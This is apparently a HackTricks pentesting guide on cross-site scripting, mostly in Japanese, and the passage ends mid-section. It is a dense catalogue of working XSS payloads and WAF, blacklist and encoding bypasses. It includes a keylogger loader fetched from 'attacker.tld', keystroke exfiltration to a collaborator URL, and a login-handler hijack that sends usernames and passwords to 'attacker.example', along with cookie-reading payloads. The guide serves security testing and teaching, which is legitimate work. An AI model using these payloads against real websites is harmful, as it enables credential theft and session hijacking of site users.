# XSS (Cross Site Scripting)

{{#include ../../banners/hacktricks-training.md}}

## Methodology

1. **あなたが制御する任意の値**（_parameters_、_path_、_headers_?、_cookies_?）がHTMLに**反映されている**か、または**JS**コードで**使用**されているかを確認する。
2. **どのコンテキスト**で反映／使用されているかを特定する。
3. If **reflected**
1. どの記号が使えるかを確認し、それに応じてペイロードを準備する:
1. **raw HTML**内で:
1. 新しいHTMLタグを作れますか？
2. `javascript:` プロトコルをサポートするイベントや属性を使えますか？
3. 保護をバイパスできますか？
4. HTMLコンテンツがクライアントサイドのJSエンジン（_AngularJS_、_VueJS_、_Mavo_...）で解釈されているなら、[**Client Side Template Injection**](../client-side-template-injection-csti.md)を悪用できます。
5. JSを実行するHTMLタグを作れない場合、[**Dangling Markup - HTML scriptless injection**](../dangling-markup-html-scriptless-injection/index.html)を悪用できますか？
2. HTMLタグ内の属性内で:
1. 属性とタグから抜け出せますか？（抜け出せればraw HTMLの文脈になります）そして新しいHTMLタグを作って悪用できますか：`"><img [...]`
2. 属性からは抜け出せてもタグから抜け出せない場合（`>`がエンコードされるか削除される）、タグ次第でJSを実行するイベントを作れるかもしれません：`" autofocus onfocus=alert(1) x="`
3. 属性から抜け出せない場合（`"`がエンコードされるか削除される）、その値がどの**属性**に反映されているか、**全体を制御しているか一部だけか**によって悪用方法が異なります。例えば、`onclick=` のようなイベントを制御できれば、クリック時に任意のコードを実行させられます。もう一つの例は `href` 属性で、`javascript:` プロトコルを使って任意のコードを実行できます：**`href="javascript:alert(1)"`**
4. あなたの入力が「悪用不可タグ」に反映されている場合、`accesskey` トリックで脆弱性を悪用できるかもしれません（社会工学が必要になります）：**`" accesskey="x" onclick="alert(1)" x="`**
3. **JavaScriptコード内**で:
1. `<script>` タグからエスケープできますか？
2. 文字列からエスケープして別のJSコードを実行できますか？
3. 入力がテンプレートリテラル `` ` ` ` にあるか？
4. 保護をバイパスできますか？
4. Javascript **function** が **実行される**場合
1. 実行する関数名を指定できます。例: `?callback=alert(1)`
4. If **used**:
1. **DOM XSS** を悪用できるかもしれません。あなたの入力がどのように制御され、どの sink に渡されているかに注意してください。

複雑なXSSに取り組むとき、次が役に立つかもしれません：


{{#ref}}
debugging-client-side-js.md
{{#endref}}

## Reflected values

XSSを成功させるためにまず見つけるべきは、**あなたが制御できる値がページに反映されているか**です。

- **Intermediately reflected**: パラメータやパスの値がページに反映されていると、**Reflected XSS**を悪用できる可能性があります。
- **Stored and reflected**: あなたが制御する値がサーバに保存され、ページをアクセスするたびに反映されるなら、**Stored XSS**を悪用できる可能性があります。
- **Accessed via JS**: あなたが制御する値がJSでアクセスされている場合、**DOM XSS**を悪用できる可能性があります。

## Contexts

XSSを試みるとき、まず入力が**どこに反映されているか**を知る必要があります。コンテキストによって、任意のJSコードを実行する方法が変わります。

### Raw HTML

入力が**raw HTML**に反映されている場合、JSコードを実行するためにいくつかの**HTMLタグ**を悪用する必要があります：`<img , <iframe , <svg , <script` ... これらは使える多くのタグの一例です。\
また、[Client Side Template Injection](../client-side-template-injection-csti.md)も念頭に置いてください。

### Inside HTML tags attribute

入力がタグの属性の値として反映されている場合、次を試せます：

1. **属性とタグから抜け出す**（そうすればraw HTML文脈になります）そして新しいHTMLタグを作って悪用する：`"><img [...]`
2. **属性からは抜け出せるがタグからは抜け出せない**場合（`>`がエンコードされるか削除される）、タグによってはJSを実行する**イベント**を作れるかもしれません：`" autofocus onfocus=alert(1) x="`
3. **属性から抜け出せない**場合（`"`がエンコードされるか削除される）、その値がどの**属性**に反映されているか、そして**全体を制御しているか一部だけか**によって悪用手法が変わります。例えば、`onclick=` のようなイベントを制御できれば、クリック時に任意のコードを実行できます。`href` 属性では `javascript:` プロトコルを使って任意のコードを実行できます：**`href="javascript:alert(1)"`**
4. 入力が「**悪用不可タグ**」に反映されている場合、`accesskey` トリックで脆弱性を悪用できることがあります（社会工学が必要）：**`" accesskey="x" onclick="alert(1)" x="`**

#### Attribute-only login XSS behind WAFs

企業のSSOログインページがOAuthの `service` パラメータを `<a id="forgot_btn" ...>` の `href` 属性内に反映していました。`<` と `>` はHTMLエンコードされていましたが、ダブルクォートはされていなかったため、攻撃者は属性を閉じて同じ要素を再利用してハンドラを注入できました：`" onfocus="payload" x="`。

1. **ハンドラを注入する:** `onclick="print(1)"` のような単純なペイロードはブロックされましたが、WAFはインライン属性内の最初のJavaScript文のみを検査していました。無害な式を括弧で囲んで先頭に置き、セミコロンで区切ることで本来のペイロードを実行できました：`onfocus="(history.length);malicious_code_here"`。
2. **自動発火させる:** ブラウザはフラグメントと一致する `id` を持つ要素にフォーカスを当てるので、エクスプロイトURLに `#forgot_btn` を付けるとページ読み込み時にアンカーにフォーカスが当たり、クリック不要でハンドラが実行されます。
3. **インラインのスタブを小さく保つ:** 対象はすでにjQueryを読み込んでいました。ハンドラは `$.getScript(...)` を起動するだけで十分で、フルのキーロガーは攻撃者のサーバ上に置かれていました。

**Building strings without quotes**

シングルクォートはURLエンコードされ返され、エスケープされたダブルクォートは属性を破壊したため、ペイロードはすべて `String.fromCharCode` で文字列を生成していました。任意のURLを文字コードに変換して属性に貼り付ける前に簡単に加工できるヘルパー関数があると便利です：
```javascript
function toCharCodes(str){
return `const url = String.fromCharCode(${[...str].map(c => c.charCodeAt(0)).join(',')});`
}
console.log(toCharCodes('https://attacker.tld/keylogger.js'))
```
結果として得られた属性は次のように見えました:
```html
onfocus="(history.length);const url=String.fromCharCode(104,116,116,112,115,58,47,47,97,116,116,97,99,107,101,114,46,116,108,100,47,107,101,121,108,111,103,103,101,114,46,106,115);$.getScript(url),function(){}"
```
**なぜこれで認証情報が盗まれるのか**

外部スクリプト（攻撃者がコントロールするホストまたは Burp Collaborator からロードされる）は `document.onkeypress` をフックし、キー入力をバッファに溜め、毎秒 `new Image().src = collaborator_url + keys` を送信していた。XSS が未認証ユーザーにのみ発生するため、影響を受ける重要な操作はログインフォーム自体であり—被害者が "Login" を押さなくても攻撃者はユーザー名とパスワードをキーログする。

クラス名を制御すると Angular が XSS を実行するという奇妙な例:
```html
<div ng-app>
<strong class="ng-init:constructor.constructor('alert(1)')()">aaa</strong>
</div>
```
### JavaScript コード内

この場合、入力はHTMLページの**`<script> [...] </script>`**タグ内、`.js`ファイル内、または**`javascript:`**プロトコルを使った属性内に反映されます：

- もし**`<script> [...] </script>`**タグの間に反映される場合、入力がどんな種類の引用符の中にあっても、`</script>` を注入してこのコンテキストから脱出することを試せます。これは**ブラウザはまずHTMLタグを解析する**ためその後コンテンツを処理し、注入した `</script>` タグがHTMLコード内にあることを検出しないからです。
- もし反映が**JS文字列内**で、前のトリックが効かない場合は、文字列を**脱出（exit）**し、コードを**実行（execute）**し、JSコードを**再構築（reconstruct）**する必要があります（もしエラーがあれば実行されません）:
- `'-alert(1)-'`
- `';-alert(1)//`
- `\';alert(1)//`
- テンプレートリテラル内に反映される場合は、`${ ... }`構文を使って**JS式を埋め込む**ことができます: `` var greetings = `Hello, ${alert(1)}` ``
- **Unicode encode** は**valid javascript code**を書くのに使えます:
```javascript
alert(1)
alert(1)
alert(1)
```
#### Javascript Hoisting

Javascript Hoisting は、XSS が未宣言の変数や関数を使っているような状況を悪用するために、使用後に関数、変数、またはクラスを宣言できる機会を指します。\
**詳細は次のページを参照してください：**


{{#ref}}
js-hoisting.md
{{#endref}}

### Javascript Function

複数のウェブページには、**実行する関数の名前をパラメータとして受け取る**エンドポイントがあります。よく見られる例は `?callback=callbackFunc` のようなものです。

ユーザーが直接渡した値が実行されようとしているかを確かめる良い方法は、**パラメータの値を変更する**（例えば 'Vulnerable' にする）ことで、コンソールに次のようなエラーが出るかを確認することです：

![](<../../images/image (711).png>)

脆弱であれば、単に次の値を送るだけで **alert をトリガー**できる場合があります: **`?callback=alert(1)`**。しかし、この種のエンドポイントは非常に一般的に、文字、数字、ドット、アンダースコアのみを許可するように**コンテンツを検証**します（**`[\w\._]`**）。

とはいえ、その制限があってもいくつかの操作は可能です。これは、有効な文字を使って **DOM の任意の要素にアクセスできる**ためです：

![](<../../images/image (747).png>)

これに便利ないくつかの関数：
```
firstElementChild
lastElementChild
nextElementSibiling
lastElementSibiling
parentElement
```
You can also try to **trigger Javascript functions** directly: `obj.sales.delOrders`.

しかし通常、指定した関数を実行するエンドポイントはあまり興味深いDOMを持たないことが多く、**other pages in the same origin**はより多くの操作を行うために**more interesting DOM**を持っていることが多いです。

したがって、**異なるDOMでこの脆弱性を悪用するために**、**Same Origin Method Execution (SOME)**のエクスプロイトが開発されました:


{{#ref}}
some-same-origin-method-execution.md
{{#endref}}

### DOM

**JS code**が、**安全でない方法で**`location.href` のような**攻撃者により制御されるデータ**を使用している場合があります。攻撃者はこれを悪用して任意のJSコードを実行できます。


{{#ref}}
dom-xss.md
{{#endref}}

### **Universal XSS**

この種のXSSは**どこにでも**見つかり得ます。それらはウェブアプリケーションのクライアント側の悪用だけに依存するのではなく、**任意の** **コンテキスト**に依存します。この種の**arbitrary JavaScript execution**は、**RCE**を引き起こしたり、クライアントやサーバ上の**任意の** **ファイル**を**読み取る**など、さらに多くの悪用が可能です。\
いくつかの**例**:


{{#ref}}
server-side-xss-dynamic-pdf.md
{{#endref}}


{{#ref}}
../../network-services-pentesting/pentesting-web/electron-desktop-apps/
{{#endref}}

## WAF bypass encoding image

![from https://twitter.com/hackerscrolls/status/1273254212546281473?s=21](<../../images/EauBb2EX0AERaNK (1).jpg>)

## 生のHTML内への注入

入力が**HTMLページ内**に反映される場合、あるいはこのコンテキストでHTMLコードをエスケープして注入できる場合、最初に行うべきことは`<`を悪用して新しいタグを作れるか確認することです: 単純にその**文字**を反映させてみて、**HTMLエンコード**されるか**削除**されるか、あるいは**変更なしで反映**されるかを確認してください。**最後の場合に限り、この脆弱性を悪用できます。**\
この場合は[**Client Side Template Injection**](../client-side-template-injection-csti.md)も**念頭に置いて**ください.\
_**注意: HTMLコメントは`-->`または`--!>`を使って閉じることができます**_

In this case and if no black/whitelisting is used, you could use payloads like:
```html
<script>
alert(1)
</script>
<img src="x" onerror="alert(1)" />
<svg onload=alert('XSS')>
```
ただし、tags/attributes のブラック/ホワイトリスティングが使われている場合、作成できるタグを **brute-force which tags** する必要があります。\
許可されているタグを **located which tags are allowed** したら、発見した有効なタグ内の **brute-force attributes/events** を行って、どのようにコンテキストを攻撃できるか確認する必要があります。

### Tags/Events brute-force

Go to [**https://portswigger.net/web-security/cross-site-scripting/cheat-sheet**](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) and click on _**Copy tags to clipboard**_. Then, send all of them using Burp intruder and check if any tags wasn't discovered as malicious by the WAF. Once you have discovered which tags you can use, you can **brute force all the events** using the valid tags (in the same web page click on _**Copy events to clipboard**_ and follow the same procedure as before).

### Custom tags

If you didn't find any valid HTML tag, you could try to **create a custom tag** and and execute JS code with the `onfocus` attribute. In the XSS request, you need to end the URL with `#` to make the page **focus on that object** and **execute** the code:
```
/?search=<xss+id%3dx+onfocus%3dalert(document.cookie)+tabindex%3d1>#x
```
### Blacklist Bypasses

もし何らかの blacklist が使われている場合、いくつかの簡単なトリックでそれを bypass できるか試してみてください:
```javascript
//Random capitalization
<script> --> <ScrIpT>
<img --> <ImG

//Double tag, in case just the first match is removed
<script><script>
<scr<script>ipt>
<SCRscriptIPT>alert(1)</SCRscriptIPT>

//You can substitude the space to separate attributes for:
/
/*%00/
/%00*/
%2F
%0D
%0C
%0A
%09

//Unexpected parent tags
<svg><x><script>alert('1'&#41</x>

//Unexpected weird attributes
<script x>
<script a="1234">
<script ~~~>
<script/random>alert(1)</script>
<script      ///Note the newline
>alert(1)</script>
<scr\x00ipt>alert(1)</scr\x00ipt>

//Not closing tag, ending with " <" or " //"
<iframe SRC="javascript:alert('XSS');" <
<iframe SRC="javascript:alert('XSS');" //

//Extra open
<<script>alert("XSS");//<</script>

//Just weird an unexpected, use your imagination
<</script/script><script>
<input type=image src onerror="prompt(1)">

//Using `` instead of parenthesis
onerror=alert`1`

//Use more than one
<<TexTArEa/*%00//%00*/a="not"/*%00///AutOFocUs////onFoCUS=alert`1` //
```
### Length bypass (small XSSs)

> [!NOTE] > **異なる環境向けのより小さな XSS** payload [**can be found here**](https://github.com/terjanq/Tiny-XSS-Payloads) と [**here**](https://tinyxss.terjanq.me).
```html
<!-- Taken from the blog of Jorge Lajara -->
<svg/onload=alert``> <script src=//aa.es> <script src=//℡㏛.pw>
```
最後のものは2つの unicode 文字を使用しており、5つに展開されます: telsr\
More of these characters can be found [here](https://www.unicode.org/charts/normalization/).\
To check in which characters are decomposed check [here](https://www.compart.com/en/unicode/U+2121).

### Click XSS - Clickjacking

もし脆弱性を悪用するために、**ユーザがリンクまたはフォームをクリックする**必要があり、事前にデータが入力されているなら、ページが脆弱であれば[**abuse Clickjacking**](../clickjacking.md#xss-clickjacking)を試すことができます。

### Impossible - Dangling Markup

もし単に**HTMLタグに属性を付けてJSコードを実行することは不可能だ**と考えているなら、[**Danglig Markup** ](../dangling-markup-html-scriptless-injection/index.html)を確認してください。脆弱性を**exploit**し、**JS**を**実行せずに**利用できる場合があります。

## Injecting inside HTML tag

### Inside the tag/escaping from attribute value

もし**HTMLタグの内部にいる**なら、まず試すべきことはタグから**エスケープ**して、[previous section](#injecting-inside-raw-html)で述べた手法のいくつかを使ってJSコードを実行することです。\
もしタグから**エスケープできない**場合、タグ内に新しい属性を作成してJSコードを実行しようとできます。例えば次のようなペイロードを使う（_この例では属性からエスケープするためにダブルクオートを使用しています。入力がタグ内に直接反映される場合はこれらは不要です_）：
```bash
" autofocus onfocus=alert(document.domain) x="
" onfocus=alert(1) id=x tabindex=0 style=display:block>#x #Access http://site.com/?#x t
```
**スタイルイベント**
```python
<p style="animation: x;" onanimationstart="alert()">XSS</p>
<p style="animation: x;" onanimationend="alert()">XSS</p>

#ayload that injects an invisible overlay that will trigger a payload if anywhere on the page is clicked:
<div style="position:fixed;top:0;right:0;bottom:0;left:0;background: rgba(0, 0, 0, 0.5);z-index: 5000;" onclick="alert(1)"></div>
#moving your mouse anywhere over the page (0-click-ish):
<div style="position:fixed;top:0;right:0;bottom:0;left:0;background: rgba(0, 0, 0, 0.0);z-index: 5000;" onmouseover="alert(1)"></div>
```
### 属性内

たとえ**属性からエスケープできない場合**（`"` がエンコードされるか削除される）でも、値が反映される**どの属性か**や、値全体を制御できるか**一部だけか**によって、悪用できる場合があります。**例えば**、`onclick=` のようなイベントを制御できれば、クリック時に任意のコードを実行させることができます。\
別の興味深い**例**は属性 `href` で、`javascript:` プロトコルを使って任意のコードを実行できます：**`href="javascript:alert(1)"`**

**Bypass inside event using HTML encoding/URL encode**

HTMLタグ属性の値内にある**HTMLでエンコードされた文字**は**実行時にデコードされます**。したがって次のようなものが有効になります（ペイロードは太字）： `<a id="author" href="http://none" onclick="var tracker='http://foo?`**`&apos;-alert(1)-&apos;`**`';">Go Back </a>`

Note that **any kind of HTML encode is valid**:
```javascript
//HTML entities
&apos;-alert(1)-&apos;
//HTML hex without zeros
&#x27-alert(1)-&#x27
//HTML hex with zeros
&#x00027-alert(1)-&#x00027
//HTML dec without zeros
&#39-alert(1)-&#39
//HTML dec with zeros
&#00039-alert(1)-&#00039

<a href="javascript:var a='&apos;-alert(1)-&apos;'">a</a>
<a href="&#106;avascript:alert(2)">a</a>
<a href="jav&#x61script:alert(3)">a</a>
```
**注意: URL encode も機能します:**
```python
<a href="https://example.com/lol%22onmouseover=%22prompt(1);%20img.png">Click</a>
```
**event 内での Bypass（Unicode encode を使用）**
```javascript
//For some reason you can use unicode to encode "alert" but not "(1)"
<img src onerror=\u0061\u006C\u0065\u0072\u0074(1) />
<img src onerror=\u{61}\u{6C}\u{65}\u{72}\u{74}(1) />
```
### 属性内の特殊プロトコル

そこでは、いくつかの箇所でプロトコル **`javascript:`** や **`data:`** を使用して **任意の JS コードを実行**できます。一部はユーザーの操作を必要とし、一部は不要です。
```javascript
javascript:alert(1)
JavaSCript:alert(1)
javascript:%61%6c%65%72%74%28%31%29 //URL encode
javascript&colon;alert(1)
javascript&#x003A;alert(1)
javascript&#58;alert(1)
javascript:alert(1)
java        //Note the new line
script:alert(1)

data:text/html,<script>alert(1)</script>
DaTa:text/html,<script>alert(1)</script>
data:text/html;charset=iso-8859-7,%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69%70%74%3e
data:text/html;charset=UTF-8,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=
data:text/html;charset=thing;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg
data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==
```
**これらのプロトコルを注入できる場所**

**一般的に** `javascript:` プロトコルは **属性 `href` を受け付ける任意のタグで使用でき**、および **ほとんどの属性 `src` を受け付けるタグ** でも使用できます（ただし `<img>` では不可）
```html
<a href="javascript:alert(1)">
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=">
<form action="javascript:alert(1)"><button>send</button></form>
<form id=x></form><button form="x" formaction="javascript:alert(1)">send</button>
<object data=javascript:alert(3)>
<iframe src=javascript:alert(2)>
<embed src=javascript:alert(1)>

<object data="data:text/html,<script>alert(5)</script>">
<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+" type="image/svg+xml" AllowScriptAccess="always"></embed>
<embed src="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg=="></embed>
<iframe src="data:text/html,<script>alert(5)</script>"></iframe>

//Special cases
<object data="//hacker.site/xss.swf"> .//https://github.com/evilcos/xss.swf
<embed code="//hacker.site/xss.swf" allowscriptaccess=always> //https://github.com/evilcos/xss.swf
<iframe srcdoc="<svg onload=alert(4);>">
```
**その他の難読化トリック**

_**この場合、前のセクションで説明したHTML encodingおよびUnicode encodingのトリックも、属性内にいるため有効です。**_
```javascript
<a href="javascript:var a='&apos;-alert(1)-&apos;'">
```
さらに、これらの場合には別の**良いトリック**があります：**たとえ `javascript:...` 内の入力が URL encoded されていても、実行される前に URL decoded されます。** したがって、**single quote** を使って **string** から **escape** する必要があり、かつそれが **URL encoded** されているのを見ても、**問題ありません、** それは **execution** 時に **single quote** として **interpreted** されます。
```javascript
&apos;-alert(1)-&apos;
%27-alert(1)-%27
<iframe src=javascript:%61%6c%65%72%74%28%31%29></iframe>
```
注意: もし `URLencode + HTMLencode` を任意の順序で**両方使って** **payload** をエンコードしようとしても**動作** **しません**、ただし**payload の内部でそれらを混ぜる**ことはできます。

**`javascript:` を使った Hex と Octal encode の使用**

`iframe` の `src` 属性内（少なくとも）で **Hex** と **Octal encode** を使って **HTML tags to execute JS** を記述できます:
```javascript
//Encoded: <svg onload=alert(1)>
// This WORKS
<iframe src=javascript:'\x3c\x73\x76\x67\x20\x6f\x6e\x6c\x6f\x61\x64\x3d\x61\x6c\x65\x72\x74\x28\x31\x29\x3e' />
<iframe src=javascript:'\74\163\166\147\40\157\156\154\157\141\144\75\141\154\145\162\164\50\61\51\76' />

//Encoded: alert(1)
// This doesn't work
<svg onload=javascript:'\x61\x6c\x65\x72\x74\x28\x31\x29' />
<svg onload=javascript:'\141\154\145\162\164\50\61\51' />
```
### Reverse tab nabbing
```javascript
<a target="_blank" rel="opener"
```
任意の URL を、**`<a href=`** タグ（`target="_blank"` および `rel="opener"` 属性を含む）に注入できる場合は、この挙動を悪用するために以下のページを確認してください:

{{#ref}}
../reverse-tab-nabbing.md
{{#endref}}

### on イベントハンドラのバイパス

まずはこのページ（[https://portswigger.net/web-security/cross-site-scripting/cheat-sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)）を確認して、便利な **"on" イベントハンドラ** を確認してください。\
もしこれらのイベントハンドラを作成できないようなブラックリストがある場合は、次のバイパスを試してみてください:
```javascript
<svg onload%09=alert(1)> //No safari
<svg %09onload=alert(1)>
<svg %09onload%20=alert(1)>
<svg onload%09%20%28%2c%3b=alert(1)>

//chars allowed between the onevent and the "="
IExplorer: %09 %0B %0C %020 %3B
Chrome: %09 %20 %28 %2C %3B
Safari: %2C %3B
Firefox: %09 %20 %28 %2C %3B
Opera: %09 %20 %2C %3B
Android: %09 %20 %28 %2C %3B
```
### "Unexploitable tags" における XSS (hidden input, link, canonical, meta)

[**here**](https://portswigger.net/research/exploiting-xss-in-hidden-inputs-and-meta-tags) から、**hidden inputs を悪用できるようになりました:**
```html
<button popvertarget="x">Click me</button>
<input type="hidden" value="y" popover id="x" onbeforetoggle="alert(1)" />
```
そして **meta tags** にも：
```html
<!-- Injection inside meta attribute-->
<meta
name="apple-mobile-web-app-title"
content=""
Twitter
popover
id="newsletter"
onbeforetoggle="alert(2)" />
<!-- Existing target-->
<button popovertarget="newsletter">Subscribe to newsletter</button>
<div popover id="newsletter">Newsletter popup</div>
```
参照: [**here**](https://portswigger.net/research/xss-in-hidden-input-fields): **hidden属性内でXSS payloadを実行できます**。ただし、**被害者**に**キーの組み合わせ**を押させることができる場合に限ります。Firefox (Windows/Linux) ではキーの組み合わせは **ALT+SHIFT+X**、OS X では **CTRL+ALT+X** です。access key attributeで別のキーを指定すれば、異なるキーの組み合わせを指定できます。攻撃ベクターは以下のとおりです:
```html
<input type="hidden" accesskey="X" onclick="alert(1)">
```
**XSS payload は次のようになります: `" accesskey="x" onclick="alert(1)" x="`**

### Blacklist Bypasses

このセクションでは既にいくつかの異なるエンコーディングを使ったトリックが紹介されています。どこで使えるかを確認するために**戻って学んでください:** 

- **HTML encoding (HTML tags)**
- **Unicode encoding (can be valid JS code):** `\u0061lert(1)`
- **URL encoding**
- **Hex and Octal encoding**
- **data encoding**

**Bypasses for HTML tags and attributes**

前のセクションの[ Blacklist Bypasses of the previous section](#blacklist-bypasses)を読んでください。

**Bypasses for JavaScript code**

次のセクションの[JavaScript bypass blacklist of the following section](#javascript-bypass-blacklists-techniques)を読んでください。

### CSS-Gadgets

もしウェブのごく小さな部分で**XSS**を見つけ、それが何らかの相互作用を必要とする（例えばフッターの小さなリンクに onmouseover 要素があるなど）場合、要素が占める領域を変更してリンクが発火する確率を最大化することを試みることができます。

例えば、要素に次のようなスタイルを追加できます: `position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: red; opacity: 0.5`

しかし、WAF が style 属性をフィルタリングしている場合は CSS Styling Gadgets を使うことができます。例えば次のようなスタイルが見つかれば

> .test {display:block; color: blue; width: 100%\}

および

> \#someid {top: 0; font-family: Tahoma;}

これでリンクを次のように変更できます

> \<a href="" id=someid class=test onclick=alert() a="">

この手法は [https://medium.com/@skavans\_/improving-the-impact-of-a-mouse-related-xss-with-styling-and-css-gadgets-b1e5dec2f703](https://medium.com/@skavans_/improving-the-impact-of-a-mouse-related-xss-with-styling-and-css-gadgets-b1e5dec2f703) から取られています。

## Injecting inside JavaScript code

この場合、あなたの **input** は `.js` ファイルの **JS code** 内、または `<script>...</script>` タグ内、JS を実行する HTML イベント内、あるいは `javascript:` プロトコルを受け入れる属性内に**反映されます**。

### \<script> タグのエスケープ
```javascript
</script><img src=1 onerror=alert(document.domain)>
```
Note that in this example we **haven't even closed the single quote**. This is because **HTML parsing is performed first by the browser**, which involves identifying page elements, including blocks of script. The parsing of JavaScript to understand and execute the embedded scripts is only carried out afterward.

### JS コード内

`<>` が sanitised されている場合でも、入力が**配置されている箇所**で**文字列をエスケープ**して**任意の JS を実行**することは可能です。**JS の構文を修正**することが重要です。エラーがあると JS コードは実行されません:
```
'-alert(document.domain)-'
';alert(document.domain)//
\';alert(document.domain)//
```
#### JS-in-JS string break → inject → repair パターン

ユーザ入力が引用された JavaScript 文字列内に入る場合（例: server-side echo が inline script に出力される）、文字列を終了させてコードを inject し、構文を修復してパースを有効に保てます。一般的なスケルトン：
```
"            // end original string
;            // safely terminate the statement
<INJECTION>  // attacker-controlled JS
; a = "      // repair and resume expected string/statement
```
脆弱なパラメータがJS文字列に反映されるときのURLパターンの例:
```
?param=test";<INJECTION>;a="
```
これは HTML コンテキストに触れることなく attacker JS を実行します（pure JS-in-JS）。フィルタが keywords をブロックする場合は、下の blacklist bypasses と組み合わせてください。

### テンプレートリテラル ``

単一引用符や二重引用符以外で**文字列**を構築するために、JS は **backticks** **` `` `** も受け付けます。これはテンプレートリテラルと呼ばれ、`${ ... }` 構文を使って**JS 式を埋め込む**ことができます.\
したがって、入力が backticks を使った JS の文字列内に**reflected**されている場合、`${ ... }` 構文を悪用して**任意の JS コード**を実行できます:

これは以下のように**悪用**できます:
```javascript
;`${alert(1)}``${`${`${`${alert(1)}`}`}`}`
```

```javascript
// This is valid JS code, because each time the function returns itself it's recalled with ``
function loop() {
return loop
}
loop``
```
### エンコードされた code の実行
```html
<script>\u0061lert(1)</script>
<svg><script>alert&lpar;'1'&rpar;
<svg><script>alert(1)</script></svg>  <!-- The svg tags are neccesary
<iframe srcdoc="<SCRIPT>alert(1)</iframe>">
```
#### eval(atob()) を使った配布可能な payloads とスコープのニュアンス

URLsを短く保ち、単純なキーワードフィルタを回避するために、実際のロジックをbase64エンコードし、`eval(atob('...'))` で評価できます。単純なキーワードフィルタが `alert`、`eval`、または `atob` のような識別子をブロックする場合は、ブラウザで同一にコンパイルされつつ文字列マッチフィルタを回避するUnicodeエスケープされた識別子を使用してください：
```
\u0061\u006C\u0065\u0072\u0074(1)                      // alert(1)
\u0065\u0076\u0061\u006C(\u0061\u0074\u006F\u0062('BASE64'))  // eval(atob('...'))
```
重要なスコーピング上の注意: `const`/`let` が `eval()` 内で宣言されるとブロックスコープになり、グローバルを作成しません; 後続のスクリプトからはアクセスできません。必要な場合は、動的に注入した `<script>` 要素を使用して、グローバルで再バインド不能なフックを定義してください（例: to hijack a form handler）：
```javascript
var s = document.createElement('script');
s.textContent = "const DoLogin = () => {const pwd = Trim(FormInput.InputPassword.value); const user = Trim(FormInput.InputUtente.value); fetch('https://attacker.example/?u='+encodeURIComponent(user)+'&p='+encodeURIComponent(pwd));}";
document.head.appendChild(s);
```
参照: https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval

### Unicode エンコードによる JS 実行
```javascript
alert(1)
alert(1)
alert(1)
```
### JavaScript による blacklists 回避のテクニック

**文字列**
```javascript
"thisisastring"
'thisisastrig'
`thisisastring`
/thisisastring/ == "/thisisastring/"
/thisisastring/.source == "thisisastring"
"\h\e\l\l\o"
String.fromCharCode(116,104,105,115,105,115,97,115,116,114,105,110,103)
"\x74\x68\x69\x73\x69\x73\x61\x73\x74\x72\x69\x6e\x67"
"\164\150\151\163\151\163\141\163\164\162\151\156\147"
"\u0074\u0068\u0069\u0073\u0069\u0073\u0061\u0073\u0074\u0072\u0069\u006e\u0067"
"\u{74}\u{68}\u{69}\u{73}\u{69}\u{73}\u{61}\u{73}\u{74}\u{72}\u{69}\u{6e}\u{67}"
"\a\l\ert\(1\)"
atob("dGhpc2lzYXN0cmluZw==")
eval(8680439..toString(30))(983801..toString(36))
```
**特殊なエスケープ**
```javascript
"\b" //backspace
"\f" //form feed
"\n" //new line
"\r" //carriage return
"\t" //tab
"\b" //backspace
"\f" //form feed
"\n" //new line
"\r" //carriage return
"\t" //tab
// Any other char escaped is just itself
```
**JSコード内のスペースの置換**
```javascript
<TAB>
/**/
```
**JavaScript comments (から** [**JavaScript Comments**](#javascript-comments) **トリック)**
```javascript
//This is a 1 line comment
/* This is a multiline comment*/
<!--This is a 1line comment
#!This is a 1 line comment, but "#!" must to be at the beggining of the first line
-->This is a 1 line comment, but "-->" must to be at the beggining of the first line
```
**JavaScriptの改行 ( [**JavaScript new line**](#javascript-new-lines) トリック由来)**
```javascript
//Javascript interpret as new line these chars:
String.fromCharCode(10)
alert("//\nalert(1)") //0x0a
String.fromCharCode(13)
alert("//\ralert(1)") //0x0d
String.fromCharCode(8232)
alert("//\u2028alert(1)") //0xe2 0x80 0xa8
String.fromCharCode(8233)
alert("//\u2029alert(1)") //0xe2 0x80 0xa9
```
**JavaScript 空白文字**
```javascript
log=[];
function funct(){}
for(let i=0;i<=0x10ffff;i++){
try{
eval(`funct${String.fromCodePoint(i)}()`);
log.push(i);
}
catch(e){}
}
console.log(log)
//9,10,11,12,13,32,160,5760,8192,8193,8194,8195,8196,8197,8198,8199,8200,8201,8202,8232,8233,8239,8287,12288,65279

//Either the raw characters can be used or you can HTML encode them if they appear in SVG or HTML attributes:
<img/src/onerror=alert&#65279;(1)>
```
**コメント内の Javascript**
```javascript
//If you can only inject inside a JS comment, you can still leak something
